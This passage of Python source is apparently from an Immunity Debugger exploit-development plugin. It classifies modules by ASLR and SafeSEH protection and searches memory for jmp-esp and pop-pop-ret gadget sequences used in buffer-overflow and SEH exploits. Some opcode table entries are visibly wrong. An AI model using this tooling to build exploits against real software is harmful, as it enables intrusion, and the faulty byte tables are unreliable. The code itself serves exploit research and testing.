				if exclentry.lower().strip() == modulename.lower().strip():
					modfound = True
		self.isExcluded = modfound
		
		#done - populate variables
		self.isAslr = modisaslr
		
		self.isSafeSEH = modissafeseh
		
		self.isRebase = modrebased
		
		self.isNX = modisnx
		
		self.isOS = modisos
		
		self.moduleKey = modulename
	
		self.modulePath = path
		
		self.moduleBase = mzbase
		
		self.moduleSize = mzsize
		
		self.moduleTop = mztop
		
		self.moduleVersion = mversion
		
			
	
	def __str__(self):
		#return general info about the module
		#modulename + info
		"""
		Get information about a module (human readable format)

		Arguments:
		None

		Return:
		String with various properties about a module
		"""			
		outstring = ""
		if self.moduleKey != "":
			outstring = "[" + self.moduleKey + "] ASLR: " + str(self.isAslr) + ", Rebase: " + str(self.isRebase) + ", SafeSEH: " + str(self.isSafeSEH) + ", OS: " + str(self.isOS) + ", v" + self.moduleVersion + " (" + self.modulePath + ")"
		else:
			outstring = "[None]"
		return outstring
		
	def isAslr(self):
		return self.isAslr
		
	def isSafeSEH(self):
		return self.isSafeSEH
		
	def isRebase(self):
		return self.isRebase
		
	def isOS(self):
		return self.isOS
	
	def isNX(self):
		return self.isNX
		
	def moduleKey(self):
		return self.moduleKey
		
	def modulePath(self):
		return self.modulePath
	
	def moduleBase(self):
		return self.moduleBase
	
	def moduleSize(self):
		return self.moduleSize
	
	def moduleTop(self):
		return self.moduleTop
		
	def moduleVersion(self):
		return self.moduleVersion
		
	def isExcluded(self):
		return self.isExcluded
	
	def getFunctionCalls(self,criteria={}):
		funccalls = {}
		sequences = []
		sequences.append(["call","\xff\x15"])
		funccalls = searchInRange(sequences, self.moduleBase, self.moduleTop,criteria)
		return funccalls
		
	def getIAT(self):
		themod = imm.getModule(self.moduleKey)
		syms = themod.getSymbols()
		IAT = {}
		thename = ""
		for sym in syms:
			if syms[sym].getType().startswith("Import"):
				thename = syms[sym].getName()
				theaddress = syms[sym].getAddress()
				if not theaddress in IAT:
					IAT[theaddress] = thename
		
		if len(IAT) == 0:
			#search method nr 2, not accurate, but will find *something*
			funccalls = self.getFunctionCalls()
			for functype in funccalls:
				for fptr in funccalls[functype]:
					ptr=struct.unpack('<L',imm.readMemory(fptr+2,4))[0]
					if ptr >= self.moduleBase and ptr <= self.moduleTop:
						if not ptr in IAT:
							thisfunc = immlib.Function(imm,ptr)
							thisfuncfullname = thisfunc.getName().lower()
							thisfuncname = thisfuncfullname.split('.')		
							IAT[ptr] = thisfuncname[1].strip(">")
		return IAT
		
		
	def getEAT(self):
		themod = imm.getModule(self.moduleKey)
		syms = themod.getSymbols()
		EAT = {}
		thename = ""
		for sym in syms:
			if syms[sym].getType().startswith("Export"):
				thename = syms[sym].getName()
				theaddress = syms[sym].getAddress()
				if not theaddress in EAT:
					EAT[theaddress] = thename
		return EAT
	
	
	def getShortName(self):
		thismodule = self.moduleKey
		modnameparts = thismodule.split(".")
		modname = ""
		pcnt = 0
		while pcnt < len(modnameparts)-1:
			modname += modnameparts[pcnt] + "."
			pcnt += 1
		modname = modname.strip(".")
		return modname
		
	
#---------------------------------------#
#  Class to access pointer properties   #
#---------------------------------------#
class MnPointer:
	"""
	Class to access pointer properties
	"""
	def __init__(self,address):
	
		# check that the address is an integer
		if not type(address) == int and not type(address) == long:
			raise Exception("address should be an integer or long")
	
		self.address = address
		
		# define the characteristics of the pointer
		byte1,byte2,byte3,byte4 = splitAddress(address)
		NullRange 			= [0]
		AsciiRange			= range(1,128)
		AsciiPrintRange		= range(20,127)
		AsciiUppercaseRange = range(65,91)
		AsciiLowercaseRange = range(97,123)
		AsciiAlphaRange     = AsciiUppercaseRange + AsciiLowercaseRange
		AsciiNumericRange   = range(48,58)
		AsciiSpaceRange     = [32]
		
		self.HexAddress = toHex(address)
		
		# Nulls
		self.hasNulls = (byte1 == 0) or (byte2 == 0) or (byte3 == 0) or (byte4 == 0)
		
		# Starts with null
		self.startsWithNull = (byte1 == 0)
		
		# Unicode
		self.isUnicode = ((byte1 == 0) and (byte3 == 0))
		
		# Unicode reversed
		self.isUnicodeRev = ((byte2 == 0) and (byte4 == 0))		
		
		# Unicode transform
		self.unicodeTransform = UnicodeTransformInfo(self.HexAddress) 
		
		# Ascii
		if not self.isUnicode and not self.isUnicodeRev:			
			self.isAscii = bytesInRange(address, AsciiRange)
		else:
			self.isAscii = bytesInRange(address, NullRange + AsciiRange)
		
		# AsciiPrintable
		if not self.isUnicode and not self.isUnicodeRev:
			self.isAsciiPrintable = bytesInRange(address, AsciiPrintRange)
		else:
			self.isAsciiPrintable = bytesInRange(address, NullRange + AsciiPrintRange)
			
		# Uppercase
		if not self.isUnicode and not self.isUnicodeRev:
			self.isUppercase = bytesInRange(address, AsciiUppercaseRange)
		else:
			self.isUppercase = bytesInRange(address, NullRange + AsciiUppercaseRange)
		
		# Lowercase
		if not self.isUnicode and not self.isUnicodeRev:
			self.isLowercase = bytesInRange(address, AsciiLowercaseRange)
		else:
			self.isLowercase = bytesInRange(address, NullRange + AsciiLowercaseRange)
			
		# Numeric
		if not self.isUnicode and not self.isUnicodeRev:
			self.isNumeric = bytesInRange(address, AsciiNumericRange)
		else:
			self.isNumeric = bytesInRange(address, NullRange + AsciiNumericRange)
			
		# Alpha numeric
		if not self.isUnicode and not self.isUnicodeRev:
			self.isAlphaNumeric = bytesInRange(address, AsciiAlphaRange + AsciiNumericRange + AsciiSpaceRange)
		else:
			self.isAlphaNumeric = bytesInRange(address, NullRange + AsciiAlphaRange + AsciiNumericRange + AsciiSpaceRange)
		
		# Uppercase + Numbers
		if not self.isUnicode and not self.isUnicodeRev:
			self.isUpperNum = bytesInRange(address, AsciiUppercaseRange + AsciiNumericRange)
		else:
			self.isUpperNum = bytesInRange(address, NullRange + AsciiUppercaseRange + AsciiNumericRange)
		
		# Lowercase + Numbers
		if not self.isUnicode and not self.isUnicodeRev:
			self.isLowerNum = bytesInRange(address, AsciiLowercaseRange + AsciiNumericRange)
		else:
			self.isLowerNum = bytesInRange(address, NullRange + AsciiLowercaseRange + AsciiNumericRange)
		
	
	def __str__(self):
		"""
		Get pointer properties (human readable format)

		Arguments:
		None

		Return:
		String with various properties about the pointer
		"""	
		outstring = ""
		if self.startsWithNull:
			outstring += "startnull,"
			
		elif self.hasNulls:
			outstring += "null,"
		
		#check if this pointer is unicode transform
		hexaddr = self.HexAddress
		outstring += UnicodeTransformInfo(hexaddr)

		if self.isUnicode:
			outstring += "unicode,"
		if self.isUnicodeRev:
			outstring += "unicodereverse,"			
		if self.isAsciiPrintable:
			outstring += "asciiprint,"
		if self.isAscii:
			outstring += "ascii,"
		if self.isUppercase:
			outstring == "upper,"
		if self.isLowercase:
			outstring += "lower,"
		if self.isNumeric:
			outstring+= "num,"
			
		if self.isAlphaNumeric and not (self.isUppercase or self.isLowercase or self.isNumeric):
			outstring += "alphanum,"
		
		if self.isUpperNum and not (self.isUppercase or self.isNumeric):
			outstring += "uppernum,"
		
		if self.isLowerNum and not (self.isLowercase or self.isNumeric):
			outstring += "lowernum,"
			
		outstring = outstring.rstrip(",")
		
		outstring += " {" + getPointerAccess(self.address)+"}"
		
		return outstring
	
	def getAddress(self):
		return self.address
	
	def isUnicode(self):
		return self.isUnicode
		
	def isUnicodeRev(self):
		return self.isUnicodeRev		
	
	def isUnicodeTransform(self):
		return self.unicodeTransform != ""
	
	def isAscii(self):
		return self.isAscii
	
	def isAsciiPrintable(self):
		return self.isAsciiPrintable
	
	def isUppercase(self):
		return self.isUppercase
	
	def isLowercase(self):
		return self.isLowercase
		
	def isUpperNum(self):
		return self.isUpperNum
		
	def isLowerNum(self):
		return self.isLowerNum
		
	def isNumeric(self):
		return self.isNumeric
		
	def isAlphaNumeric(self):
		return self.alphaNumeric
	
	def hasNulls(self):
		return self.hasNulls
	
	def startsWithNull(self):
		return self.startsWithNull
		
	def belongsTo(self):
		"""
		Retrieves the module a given pointer belongs to

		Arguments:
		None

		Return:
		String with the name of the module a pointer belongs to,
		or empty if pointer does not belong to a module
		"""		
		if len(g_modules)==0:
			populateModuleInfo()
		modname=""
		for thismodule,modproperties in g_modules.iteritems():
				thisbase = getModuleProperty(thismodule,"base")
				thistop = getModuleProperty(thismodule,"top")
				if (self.address >= thisbase) and (self.address <= thistop):
					return thismodule
		return modname
	
	def isOnStack(self):
		"""
		Checks if the pointer is on one of the stacks of one of the threads in the process

		Arguments:
		None

		Return:
		Boolean - True if pointer is on stack
		"""	
		stacks = getStacks()
		for stack in stacks:
			if (stacks[stack][0] < self.address) and (self.address < stacks[stack][1]):
				return True
		return False
	
	def isInHeap(self):
		"""
		Checks if the pointer is part of one of the pages associated with process heaps

		Arguments:
		None

		Return:
		Boolean - True if pointer is in heap
		"""	
		allheaps = imm.getHeapsAddress()
		inheap = False
		for heap in allheaps:
			if self.address >= heap:
				page   = imm.getMemoryPageByAddress( self.address )
				if page:
					pagesize = page.getSize()
					if self.address <= heap + pagesize:
						inheap = True
		return inheap	
		
		
#---------------------------------------#
#  Various functions                    #
#---------------------------------------#		
def containsBadChars(address,badchars="\x0a\x0d"):
	"""
	checks if the address contains bad chars
	
	Arguments:
	address  - the address
	badchars - string with the characters that should be avoided (defaults to 0x0a and 0x0d)
	
	Return:
	Boolean - True if badchars are found
	"""
	
	bytes = splitAddress(address)
	chars = []
	for byte in bytes:
		chars.append(chr(byte))
	
	# check each char
	for char in chars:
		if char in badchars:
			return True			
	return False


def meetsCriteria(pointer,criteria):
	"""
	checks if an address meets the listed criteria

	Arguments:
	pointer - the MnPointer instance of the address
	criteria - a dictionary with all the criteria to be met

	Return:
	Boolean - True if all the conditions are met
	"""
	
	# Unicode
	if "unicode" in criteria and not (pointer.isUnicode or pointer.unicodeTransform != ""):
		return False
		
	if "unicoderev" in criteria and not pointer.isUnicodeRev:
		return False		
		
	# Ascii
	if "ascii" in criteria and not pointer.isAscii:
		return False
	
	# Ascii printable
	if "asciiprint" in criteria and not pointer.isAsciiPrintable:
		return False
	
	# Uppercase
	if "upper" in criteria and not pointer.isUppercase:
		return False
		
	# Lowercase
	if "lower" in criteria and not pointer.isLowercase:
		return False
	
	# Uppercase numeric
	if "uppernum" in criteria and not pointer.isUpperNum:
		return False
	
	# Lowercase numeric
	if "lowernum" in criteria and not pointer.isLowerNum:
		return False	
		
	# Numeric
	if "numeric" in criteria and not pointer.isNumeric:
		return False
	
	# Alpha numeric
	if "alphanum" in criteria and not pointer.isAlphaNumeric:
		return False
		
	# Bad chars
	if "badchars" in criteria and containsBadChars(pointer.getAddress(), criteria["badchars"]):
		return False

	# Nulls
	if "nonull" in criteria and pointer.hasNulls:
		return False
	
	if "startswithnull" in criteria and not pointer.startsWithNull:
		return False
	
	return True

def search(sequences,criteria=[]):
	"""
	Alias for 'searchInRange'
	search for byte sequences in a specified address range

	Arguments:
	sequences - array of byte sequences to search for
	start - the start address of the search (defaults to 0)
	end   - the end address of the search
	criteria - Dictionary containing the criteria each pointer should comply with

	Return:
	Dictionary (opcode sequence => List of addresses)
	"""	
	return searchInRange(sequences,criteria)
	
	
def searchInRange(sequences, start=0, end=TOP_USERLAND,criteria=[]):
	"""
	search for byte sequences in a specified address range

	Arguments:
	sequences - array of byte sequences to search for
	start - the start address of the search (defaults to 0)
	end   - the end address of the search
	criteria - Dictionary containing the criteria each pointer should comply with

	Return:
	Dictionary (opcode sequence => List of addresses)
	"""
	
	if not "accesslevel" in criteria:
		criteria["accesslevel"] = "*"
	
	global ptr_counter
	global ptr_to_get
	
	found_opcodes = {}
	
	if (ptr_to_get < 0) or (ptr_to_get > 0 and ptr_counter < ptr_to_get):

		if not sequences:
			return {}
			
		# check that start is before end
		if start > end:
			#swap start and end
			temp = start
			start = end
			end = temp

		imm.getMemoryPages()
		imm.setStatusBar("Searching...")
		for a in imm.MemoryPages.keys():

			if (ptr_to_get < 0) or (ptr_to_get > 0 and ptr_counter < ptr_to_get):
		
				# get end address of the page
				page_start = a
				page_end   = a + imm.MemoryPages[a].getSize()
				
				if ( start > page_end or end < page_start ):
					# we are outside the search range, skip
					continue
				if (not meetsAccessLevel(imm.MemoryPages[a],criteria["accesslevel"])):
					#skip this page, not executable
					continue
					
				# if the criteria check for nulls or unicode, we can skip
				# modules that start with 00
				start_fb = toHex(page_start)[0:2]
				end_fb = toHex(page_end)[0:2]
				if ( ("nonull" in criteria and criteria["nonull"]) and start_fb == "00" and end_fb == "00"  ):
					if not silent:
						imm.log("      !Skipped search of range %08x-%08x (Has nulls)" % (page_start,page_end))
					continue
				
				if (( ("startswithnull" in criteria and criteria["startswithnull"]))
						and (start_fb != "00" or end_fb != "00")):
					if not silent:
						imm.log("      !Skipped search of range %08x-%08x (Doesn't start with null)" % (page_start,page_end))
					continue
				
				mem = imm.MemoryPages[a].getMemory()
				if not mem:
					continue
				

				# loop on each sequence
				for seq in sequences:
					if (ptr_to_get < 0) or (ptr_to_get > 0 and ptr_counter < ptr_to_get):
						buf = None
						human_format = ""
						if type(seq) == str:
							human_format = seq.replace("\n"," # ")
							buf = imm.assemble(seq)
						else:
							human_format = seq[0].replace("\n"," # ")
							buf = seq[1]				
						
						buf_len      = len(buf)
						mem_list     = mem.split( buf )
						total_length = buf_len * -1
						recur_find   = []
						
						for i in mem_list:
							total_length = total_length + len(i) + buf_len
							seq_address = a + total_length
							recur_find.append( seq_address )

						#The last one is the remaining slice from the split
						#so remove it from the list
						del recur_find[ len(recur_find) - 1 ]
						
						page_find = []
						for i in recur_find:
							if ( i >= start and i <= end ):
								
								ptr = MnPointer(i)

								# check if pointer meets criteria
								if not meetsCriteria(ptr, criteria):
									continue
								
								page_find.append(i)
								
								ptr_counter += 1
								if ptr_to_get > 0 and ptr_counter >= ptr_to_get:
								#stop search
									if human_format in found_opcodes:
										found_opcodes[human_format] += page_find
									else:
										found_opcodes[human_format] = page_find
									return found_opcodes
						#add current pointers to the list and continue		
						if len(page_find) > 0:
							if human_format in found_opcodes:
								found_opcodes[human_format] += page_find
							else:
								found_opcodes[human_format] = page_find
	return found_opcodes

# search for byte sequences in a module
def searchInModule(sequences, name,criteria=[]):
	"""
	search for byte sequences in a specified module

	Arguments:
	sequences - array of byte sequences to search for
	name - the name of the module to search in

	Return:
	Dictionary (text opcode => array of addresses)
	"""	
	
	module = imm.getModule(name)
	if(not module):
		self.log("module %s not found" % name)
		return []
	
	# get the base and end address of the module
	start = module.getBaseAddress()
	end   = start + module.getSize()

	return searchInRange(sequences, start, end, criteria)

def getRangesOutsideModules():
	"""
	This function will enumerate all memory ranges that are not asssociated with a module
	
	Arguments : none
	
	Returns : array of arrays, each containing a start and end address
	"""	
	ranges=[]
	moduleranges=[]
	#get all ranges associated with modules
	#force full rebuild to get all modules
	populateModuleInfo()
	for thismodule,modproperties in g_modules.iteritems():
		top = 0
		base = 0
		for modprop,modval in modproperties.iteritems():
			if modprop == "top":
				top = modval
			if modprop == "base":
				base = modval
		moduleranges.append([base,top])
	#sort them
	moduleranges.sort()
	#get all ranges before, after and in between modules
	startpointer = 0
	endpointer = TOP_USERLAND
	for modbase,modtop in moduleranges:
		endpointer = modbase-1
		ranges.append([startpointer,endpointer])
		startpointer = modtop+1
	ranges.append([startpointer,TOP_USERLAND])
	#return array
	return ranges
	

def UnicodeTransformInfo(hexaddr):
	"""
	checks if the address can be used as unicode ansi transform
	
	Arguments:
	hexaddr  - a string containing the address in hex format (4 bytes - 8 characters)
	
	Return:
	string with unicode transform info, or empty if address is not unicode transform
	"""
	outstring = ""
	transform=0
	almosttransform=0
	begin = hexaddr[0] + hexaddr[1]
	middle = hexaddr[4] + hexaddr[5]
	twostr=hexaddr[2]+hexaddr[3]
	begintwostr = hexaddr[6]+hexaddr[7]
	threestr=hexaddr[4]+hexaddr[5]+hexaddr[6]
	fourstr=hexaddr[4]+hexaddr[5]+hexaddr[6]+hexaddr[7]
	beginfourstr = hexaddr[0]+hexaddr[1]+hexaddr[2]+hexaddr[3]
	threestr=threestr.upper()
	fourstr=fourstr.upper()
	begintwostr = begintwostr.upper()
	beginfourstr = beginfourstr.upper()
	uniansiconv = [  ["20AC","80"], ["201A","82"],
		["0192","83"], ["201E","84"], ["2026","85"],
		["2020","86"], ["2021","87"], ["02C6","88"],
		["2030","89"], ["0106","8A"], ["2039","8B"],
		["0152","8C"], ["017D","8E"], ["2018","91"],
		["2019","92"], ["201C","93"], ["201D","94"],
		["2022","95"], ["2013","96"], ["2014","97"],
		["02DC","98"], ["2122","99"], ["0161","9A"],
		["203A","9B"], ["0153","9C"], ["017E","9E"],
		["0178","9F"]
		]
	# 4 possible cases :
	# 00xxBBBB
	# 00xxBBBC (close transform)
	# AAAA00xx
	# AAAABBBB
	convbyte=""
	transbyte=""
	ansibytes=""
	#case 1 and 2
	if begin == "00":	
		for ansirec in uniansiconv:
			if ansirec[0]==fourstr:
				convbyte=ansirec[1]
				transbyte=ansirec[1]
				transform=1
				break
		if transform==1:
			outstring +="unicode ansi transformed : 00"+twostr+"00"+convbyte+","
		ansistring=""
		for ansirec in uniansiconv:
			if ansirec[0][:3]==threestr:
				if (transform==0) or (transform==1 and ansirec[1] <> transbyte):
					convbyte=ansirec[1]
					ansibytes=ansirec[0]
					ansistring=ansistring+"00"+twostr+"00"+convbyte+"->00"+twostr+ansibytes+" / "
					almosttransform=1
		if almosttransform==1:
			if transform==0:
				outstring += "unicode possible ansi transform(s) : " + ansistring
			else:
				outstring +=" / alternatives (close pointers) : " + ansistring
			
	#case 3
	if middle == "00":
		transform = 0
		for ansirec in uniansiconv:
			if ansirec[0]==beginfourstr:
				convbyte=ansirec[1]
				transform=1
				break
		if transform==1:
			outstring +="unicode ansi transformed : 00"+convbyte+"00"+begintwostr+","
	#case 4
	if begin != "00" and middle != "00":
		convbyte1=""
		convbyte2=""
		transform = 0
		for ansirec in uniansiconv:
			if ansirec[0]==beginfourstr:
				convbyte1=ansirec[1]
				transform=1
				break
		if transform == 1:
			for ansirec in uniansiconv:
				if ansirec[0]==fourstr:
					convbyte2=ansirec[1]
					transform=2	
					break						
		if transform==2:
			outstring +="unicode ansi transformed : 00"+convbyte1+"00"+convbyte2+","
	
	# done
	outstring = outstring.rstrip(" / ")
	
	if outstring:
		if not outstring.endswith(","):
			outstring += ","
	return outstring

	
def getSearchSequences(searchtype,searchcriteria="",type="",criteria={}):
	"""
	will build array with search sequences for a given search type
	
	Arguments:
	searchtype = "jmp", "seh"
	
	SearchCriteria (optional): 
		<register> in case of "jmp" : string containing a register
	
	Return:
	array with all searches to perform
	"""
	offsets = [ "", "04","08","0c","10","12","1C","20","24"]
	regs=["eax","ebx","ecx","edx","esi","edi","ebp"]
	search=[]
	
	if searchtype.lower() == "jmp":
		if not searchcriteria: 
			searchcriteria = "esp"
		searchcriteria = searchcriteria.lower()
	
		min = 0
		max = 0
		
		if "mindistance" in criteria:
			min = criteria["mindistance"]
		if "maxdistance" in criteria:
			max = criteria["maxdistance"]
		
		minval = min
		
		while minval <= max:
		
			extraval = ""
			
			if minval <> 0:
				operator = ""
				negoperator = "-"
				if minval < 0:
					operator = "-"
					negoperator = ""
				thisval = str(minval).replace("-","")
				thishexval = toHex(int(thisval))
				
				extraval = operator + thishexval
			
			if minval == 0:
				search.append("jmp " + searchcriteria )
				search.append("call " + searchcriteria)
				
				for roffset in offsets:
					search.append("push "+searchcriteria+"\n ret "+roffset)
					
				for reg in regs:
					if reg != searchcriteria:
						search.append("push " + searchcriteria + "\npop "+reg+"\n jmp "+reg)
						search.append("push " + searchcriteria + "\npop "+reg+"\n call "+reg)			
						search.append("mov "+reg+"," + searchcriteria + "\n jmp "+reg)
						search.append("mov "+reg+"," + searchcriteria + "\n call "+reg)
						search.append("xchg "+reg+","+searchcriteria+"\n jmp " + reg)
						search.append("xchg "+searchcriteria+","+reg+"\n jmp " + reg)
						search.append("xchg "+reg+","+searchcriteria+"\n call " + reg)
						search.append("xchg "+searchcriteria+","+reg+"\n call " + reg)				
						for roffset in offsets:
							search.append("push " + searchcriteria + "\npop "+reg+"\n push "+reg+"\n ret "+roffset)			
							search.append("mov "+reg+"," + searchcriteria + "\n push "+reg+"\n ret "+roffset)
							search.append("xchg "+reg+","+searchcriteria+"\n push " + reg + "\nret " + roffset)
							search.append("xchg "+searchcriteria+","+reg+"\n push " + reg + "\nret " + roffset)	
			else:
				# offset jumps
				search.append("add " + searchcriteria + "," + operator + thishexval + "\n jmp " + searchcriteria)
				search.append("add " + searchcriteria + "," + operator + thishexval + "\n call " + searchcriteria)
				search.append("sub " + searchcriteria + "," + negoperator + thishexval + "\n jmp " + searchcriteria)
				search.append("sub " + searchcriteria + "," + negoperator + thishexval + "\n call " + searchcriteria)
				for roffset in offsets:
					search.append("add " + searchcriteria + "," + operator + thishexval + "\n push " + searchcriteria + "\n ret " + roffset)
					search.append("sub " + searchcriteria + "," + negoperator + thishexval + "\n push " + searchcriteria + "\n ret " + roffset)
				if minval > 0:
					search.append("jmp " + searchcriteria + extraval)
					search.append("call " + searchcriteria + extraval)
			minval += 1

	if searchtype.lower() == "seh":
		for roffset in offsets:
			for r1 in regs:
				search.append( ["add esp,4\npop " + r1+"\nret "+roffset,imm.assemble("add esp,4\npop " + r1+"\nret "+roffset)] )
				search.append( ["pop " + r1+"\nadd esp,4\nret "+roffset,imm.assemble("pop " + r1+"\nadd esp,4\nret "+roffset)] )				
				for r2 in regs:
					thissearch = ["pop "+r1+"\npop "+r2+"\nret "+roffset,imm.assemble("pop "+r1+"\npop "+r2+"\nret "+roffset)]
					search.append( thissearch )
					if type == "rop":
						search.append( ["pop "+r1+"\npop "+r2+"\npop esp\nret "+roffset,imm.assemble("pop "+r1+"\npop "+r2+"\npop esp\nret "+roffset)] )
						for r3 in regs:
							search.append( ["pop "+r1+"\npop "+r2+"\npop "+r3+"\ncall ["+r3+"]",imm.assemble("pop "+r1+"\npop "+r2+"\npop "+r3+"\ncall ["+r3+"]")] )
			search.append( ["add esp,8\nret "+roffset,imm.assemble("add esp,8\nret "+roffset)])
			search.append( ["popad\npush ebp\nret "+roffset,imm.assemble("popad\npush ebp\nret "+roffset)])					
		#popad + jmp/call
		search.append(["popad\njmp ebp",imm.assemble("popad\njmp ebp")])
		search.append(["popad\ncall ebp",imm.assemble("popad\ncall ebp")])		
		#call / jmp dword
		search.append(["call dword ptr ss:[esp+08]","\xff\x54\x24\x08"])
		search.append(["call dword ptr ss:[esp+08]","\xff\x94\x24\x08\x00\x00\x00"])
		search.append(["call dword ptr ds:[esp+08]","\x3e\xff\x54\x24\x08"])

		search.append(["jmp dword ptr ss:[esp+08]","\xff\x64\x24\x08"])
		search.append(["jmp dword ptr ss:[esp+08]","\xff\xa4\x24\x08\x00\x00\x00"])
		search.append(["jmp dword ptr ds:[esp+08]","\x3e\ff\x64\x24\x08"])
		
		search.append(["call dword ptr ss:[esp+14]","\xff\x54\x24\x14"])
		search.append(["call dword ptr ss:[esp+14]","\xff\x94\x24\x14\x00\x00\x00"])	
		search.append(["call dword ptr ds:[esp+14]","\x3e\xff\x54\x24\x14"])
		
		search.append(["jmp dword ptr ss:[esp+14]","\xff\x54\x24\x14"])
		search.append(["jmp dword ptr ss:[esp+14]","\xff\xa4\x24\x14\x00\x00\x00"])		
		search.append(["jmp dword ptr ds:[esp+14]","\x3e\xff\x54\x24\x14"])
		
		search.append(["call dword ptr ss:[esp+1c]","\xff\x54\x24\x1c"])
		search.append(["call dword ptr ss:[esp+1c]","\xff\x94\x24\x1c\x00\x00\x00"])		
		search.append(["call dword ptr ds:[esp+1c]","\x3e\xff\x54\x24\x1c"])
		
		search.append(["jmp dword ptr ss:[esp+1c]","\xff\x54\x24\x1c"])
		search.append(["jmp dword ptr ss:[esp+1c]","\xff\xa4\x24\x1c\x00\x00\x00"])		
		search.append(["jmp dword ptr ds:[esp+1c]","\x3e\xff\x54\x24\x1c"])
		
		search.append(["call dword ptr ss:[esp+2c]","\xff\x54\x24\x2c"])
		search.append(["call dword ptr ss:[esp+2c]","\xff\94\x24\x2c\x00\x00\x00"])
		search.append(["call dword ptr ds:[esp+2c]","\x3e\xff\x54\x24\x2c"])

		search.append(["jmp dword ptr ss:[esp+2c]","\xff\x54\x24\x2c"])
		search.append(["jmp dword ptr ss:[esp+2c]","\xff\xa4\x24\x2c\x00\x00\x00"])		
		search.append(["jmp dword ptr ds:[esp+2c]","\x3e\xff\x54\x24\x2c"])
		
		search.append(["call dword ptr ss:[esp+44]","\xff\x54\x24\x44"])
		search.append(["call dword ptr ss:[esp+44]","\xff\x94\x24\x44\x00\x00\x00"])		
		search.append(["call dword ptr ds:[esp+44]","\x3e\xff\x54\x24\x44"])		
		
		search.append(["jmp dword ptr ss:[esp+44]","\xff\x54\x24\x44"])
		search.append(["jmp dword ptr ss:[esp+44]","\xff\xa4\x24\x44\x00\x00\x00"])
		search.append(["jmp dword ptr ds:[esp+44]","\x3e\xff\x54\x24\x44"])
		
		search.append(["call dword ptr ss:[esp+50]","\xff\x54\x24\x50"])
		search.append(["call dword ptr ss:[esp+50]","\xff\x94\x24\x50\x00\x00\x00"])		
		search.append(["call dword ptr ds:[esp+50]","\x3e\xff\x54\x24\x50"])		
		
		search.append(["jmp dword ptr ss:[esp+50]","\xff\x54\x24\x50"])
		search.append(["jmp dword ptr ss:[esp+50]","\xff\xa4\x24\x50\x00\x00\x00"])
		search.append(["jmp dword ptr ds:[esp+50]","\x3e\xff\x54\x24\x50"])
		
		search.append(["call dword ptr ss:[ebp+0c]","\xff\x55\x0c"])
		search.append(["call dword ptr ss:[ebp+0c]","\xff\x95\x0c\x00\x00\x00"])		
		search.append(["call dword ptr ds:[ebp+0c]","\x3e\xff\x55\x0c"])		
		
		search.append(["jmp dword ptr ss:[ebp+0c]","\xff\x65\x0c"])
		search.append(["jmp dword ptr ss:[ebp+0c]","\xff\xa5\x0c\x00\x00\x00"])		
		search.append(["jmp dword ptr ds:[ebp+0c]","\x3e\xff\x65\x0c"])		
		
		search.append(["call dword ptr ss:[ebp+24]","\xff\x55\x24"])
		search.append(["call dword ptr ss:[ebp+24]","\xff\x95\x24\x00\x00\x00"])		
		search.append(["call dword ptr ds:[ebp+24]","\x3e\xff\x55\x24"])
		
		search.append(["jmp dword ptr ss:[ebp+24]","\xff\x65\x24"])
		search.append(["jmp dword ptr ss:[ebp+24]","\xff\xa5\x24\x00\x00\x00"])		
		search.append(["jmp dword ptr ds:[ebp+24]","\x3e\xff\x65\x24"])	
		
		search.append(["call dword ptr ss:[ebp+30]","\xff\x55\x30"])
		search.append(["call dword ptr ss:[ebp+30]","\xff\x95\x30\x00\x00\x00"])		
		search.append(["call dword ptr ds:[ebp+30]","\x3e\xff\x55\x30"])
		
		search.append(["jmp dword ptr ss:[ebp+30]","\xff\x65\x30"])
		search.append(["jmp dword ptr ss:[ebp+30]","\xff\xa5\x30\x00\x00\x00"])		
		search.append(["jmp dword ptr ds:[ebp+30]","\x3e\xff\x65\x30"])	
		
		search.append(["call dword ptr ss:[ebp-04]","\xff\x55\xfc"])
		search.append(["call dword ptr ss:[ebp-04]","\xff\x95\xfc\xff\xff\xff"])		
		search.append(["call dword ptr ds:[ebp-04]","\x3e\xff\x55\xfc"])
		
		search.append(["jmp dword ptr ss:[ebp-04]","\xff\x65\xfc",])
		search.append(["jmp dword ptr ss:[ebp-04]","\xff\xa5\xfc\xff\xff\xff",])		
		search.append(["jmp dword ptr ds:[ebp-04]","\x3e\xff\x65\xfc",])		
		
		search.append(["call dword ptr ss:[ebp-0c]","\xff\x55\xf4"])
		search.append(["call dword ptr ss:[ebp-0c]","\xff\x95\xf4\xff\xff\xff"])		
		search.append(["call dword ptr ds:[ebp-0c]","\x3e\xff\x55\xf4"])
		
		search.append(["jmp dword ptr ss:[ebp-0c]","\xff\x65\xf4",])
		search.append(["jmp dword ptr ss:[ebp-0c]","\xff\xa5\xf4\xff\xff\xff",])		
		search.append(["jmp dword ptr ds:[ebp-0c]","\x3e\xff\x65\xf4",])
		
		search.append(["call dword ptr ss:[ebp-18]","\xff\x55\xe8"])
		search.append(["call dword ptr ss:[ebp-18]","\xff\x95\xe8\xff\xff\xff"])		
		search.append(["call dword ptr ds:[ebp-18]","\x3e\xff\x55\xe8"])
		
		search.append(["jmp dword ptr ss:[ebp-18]","\xff\x65\xe8",])
		search.append(["jmp dword ptr ss:[ebp-18]","\xff\xa5\xe8\xff\xff\xff",])		
		search.append(["jmp dword ptr ds:[ebp-18]","\x3e\xff\x65\xe8",])
	return search

	
def getModulesToQuery(criteria):
	"""
	This function will return an array of modulenames
	
	Arguments:
	Criteria - dictionary with module criteria
	
	Return:
	array with module names that meet the given criteria
	
	"""	
	if len(g_modules) == 0:
		populateModuleInfo()
	modulestoquery=[]
	for thismodule,modproperties in g_modules.iteritems():
		#is this module excluded ?
		thismod = MnModule(thismodule)	
		included = True
		if not thismod.isExcluded:
			#check other criteria
			if ("safeseh" in criteria) and ((not criteria["safeseh"]) and thismod.isSafeSEH):
				included = False
			if ("aslr" in criteria) and ((not criteria["aslr"]) and thismod.isAslr):
				included = False
			if ("rebase" in criteria) and ((not criteria["rebase"]) and thismod.isRebase):
				included = False
			if ("os" in criteria) and ((not criteria["os"]) and thismod.isOS):
				included = False
			if ("nx" in criteria) and ((not criteria["nx"]) and thismod.isNX):
				included = False				
		else:
			included = False
		#override all previous decision if "modules" criteria was provided
		thismodkey = thismod.moduleKey.lower().strip()
		if ("modules" in criteria) and (criteria["modules"] != ""):
			included = False
			modulenames=criteria["modules"].split(",")
			for modulename in modulenames:
				modulename = modulename.strip('"').strip("'").lower()
				modulenamewithout = modulename.replace("*","")
				if len(modulenamewithout) <= len(thismodkey):
					#endswith ?
					if modulename[0] == "*":
						if modulenamewithout == thismodkey[len(thismodkey)-len(modulenamewithout):len(thismodkey)]:
